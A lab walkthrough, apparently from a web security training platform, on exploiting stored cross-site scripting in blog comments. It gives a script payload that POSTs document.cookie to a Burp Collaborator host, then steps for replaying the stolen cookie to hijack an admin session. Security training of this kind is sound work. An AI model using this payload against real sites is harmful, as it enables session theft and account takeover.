# Lab 4: Exploiting cross-site scripting to steal cookies

## ğŸ“ Lab Overview

A **stored XSS vulnerability** exists in the blog comment function. When a **simulated victim** views the comment, your malicious JavaScript executes. By exfiltrating their session cookie, you can **impersonate** the victim and access their account.

---

## ğŸš¨ Important Notes

- ğŸš« The platform firewall **blocks external interactions** â€” use **Burp Collaborator's default public server** only.
- ğŸ› ï¸ There is a **less subtle alternative** method involving CSRF + cookie disclosure, but it's not recommended.

---

## ğŸ› ï¸ Solution Steps

### ğŸ”— 1. Get Burp Collaborator Payload

- Open **Burp Suite Professional**
- Go to the **Collaborator tab**
- Click **"Copy to clipboard"** to copy your unique **Collaborator subdomain**

---

### ğŸ’¬ 2. Submit the XSS Payload

Post a **comment** with the following payload (replacing `BURP-COLLABORATOR-SUBDOMAIN`):

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>

```

ğŸ§  **How it works:**

When the victim views the comment, the script sends a `POST` request containing their cookie to your **Collaborator subdomain**.

---

### ğŸ“¡ 3. Capture the Cookie

- Go back to the **Collaborator tab**
- Click **"Poll now"**
- âœ… You should see an **HTTP interaction**
- Copy the **session cookie value** from the POST body

---

### ğŸ§ª 4. Hijack the Victim's Session

- In Burp, intercept a request to the **main blog** page or `/my-account`
- Replace **your session cookie** with the **victimâ€™s cookie**
- Forward the request
- âœ… If successful, youâ€™ll see the **admin userâ€™s account page**

ğŸ¯ **This solves the lab!**

---

## ğŸ” Alternative (Less Recommended)

Use the XSS to post the victim's cookie into another comment via **CSRF**.

âš ï¸ **Downsides:**

- Exposes the cookie publicly
- Leaves evidence of the attack

---

## ğŸ¥ Community Solution

ğŸ“º [Watch on YouTube](https://youtu.be/N_87S9XVy0w)